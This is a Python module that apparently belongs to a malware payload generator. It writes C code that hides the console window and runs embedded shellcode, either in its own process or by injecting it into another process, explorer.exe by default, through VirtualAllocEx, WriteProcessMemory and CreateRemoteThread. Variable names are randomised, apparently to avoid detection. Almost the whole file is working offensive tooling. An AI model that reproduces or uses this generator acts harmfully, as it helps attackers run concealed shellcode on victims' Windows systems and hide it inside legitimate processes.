from lib import gen, core



Shellcode = gen.Varname_Creator()
Hide_Window = gen.Varname_Creator()



def Start():
    Start_Code = "#include <windows.h>\n"
    Start_Code += "#include <tlhelp32.h>\n"
    Start_Code += "#include <stdio.h>\n"
    Start_Code += "#include <stdlib.h>\n"
    Start_Code += "#include <string.h>\n"
    Start_Code += "int main(int argc, char **argv) {"
    Start_Code += "char " + Shellcode + "[] = {"
    return Start_Code



def Hide_Window_Console():
    Hide_Window_Console_Code = "};\nHWND " + Hide_Window + " = GetConsoleWindow();"
    Hide_Window_Console_Code += "ShowWindow(" + Hide_Window + ", SW_HIDE);"
    return Hide_Window_Console_Code



def Local_Or_Remote():
    print("""
 |---------------------------------------|
 | [1] Local Thread Injection (DEFAULT); |
 | [2] Remote Thread Injection;          |
 |---------------------------------------|      
        """)

    Choice = core.core_input()

    if Choice == "1":
        Local_Thread_Injection = End_Local_Thread_Injection()
        return Local_Thread_Injection


    elif Choice == "2":
        print("""
 |-----------------------------------------------------|
 | Which process to inject ? (DEFAULT = explorer.exe); |
 |-----------------------------------------------------| 
        """)

        ProcessName = core.core_input()

        if ProcessName != "":
            Remote_Thread_Injection = End_Remote_Thread_Injection(ProcessName)
            return Remote_Thread_Injection

        else:
            ProcessName = "explorer.exe"
            Remote_Thread_Injection = End_Remote_Thread_Injection(ProcessName)
            return Remote_Thread_Injection


    else:
        Local_Thread_Injection = End_Local_Thread_Injection()
        return Local_Thread_Injection



def End_Local_Thread_Injection():

    Exec = gen.Varname_Creator()
    Local_Thread_Injection = "void *" + Exec + " = VirtualAlloc(0, sizeof " + Shellcode + ", MEM_COMMIT, PAGE_EXECUTE_READWRITE);"
    Local_Thread_Injection += "memcpy(" + Exec + ", " + Shellcode + ", sizeof " + Shellcode + ");"
    Local_Thread_Injection += "((void(*)())" + Exec + ")();}"
    return Local_Thread_Injection



def End_Remote_Thread_Injection(ProcessName):

    Entry = gen.Varname_Creator()
    Snapshot = gen.Varname_Creator()
    Process_Handle = gen.Varname_Creator()
    Remote_Thread = gen.Varname_Creator()
    Remote_Buffer = gen.Varname_Creator()

    Remote_Thread_Injection = "PROCESSENTRY32 " + Entry + ";"
    Remote_Thread_Injection += Entry + ".dwSize = sizeof(PROCESSENTRY32);"
    Remote_Thread_Injection += "HANDLE " + Snapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);"
    Remote_Thread_Injection += "if (Process32First(" + Snapshot + ", &" + Entry + ") == TRUE){"
    Remote_Thread_Injection += "while (Process32Next(" + Snapshot + ", &" + Entry + ") == TRUE){"
    Remote_Thread_Injection += 'if (stricmp(' + Entry + '.szExeFile, ' + '"' + ProcessName + '"' + ') == 0){'
    Remote_Thread_Injection += "HANDLE " + Process_Handle + ";"
    Remote_Thread_Injection += "HANDLE " + Remote_Thread + ";"
    Remote_Thread_Injection += "PVOID " + Remote_Buffer + ";"
    Remote_Thread_Injection += Process_Handle + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + Entry + ".th32ProcessID);"
    Remote_Thread_Injection += Remote_Buffer + " = VirtualAllocEx(" + Process_Handle + ", NULL, sizeof " + Shellcode + ", (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);"
    Remote_Thread_Injection += "WriteProcessMemory(" + Process_Handle + ", " + Remote_Buffer + ", " + Shellcode + ", sizeof " + Shellcode + ", NULL);"
    Remote_Thread_Injection += Remote_Thread + " = CreateRemoteThread(" + Process_Handle + ", NULL, 0, (LPTHREAD_START_ROUTINE)" + Remote_Buffer + ", NULL, 0, NULL);"
    Remote_Thread_Injection += "CloseHandle(" + Process_Handle + ");}}}"
    Remote_Thread_Injection += "CloseHandle(" + Snapshot + ");}"

    return Remote_Thread_Injection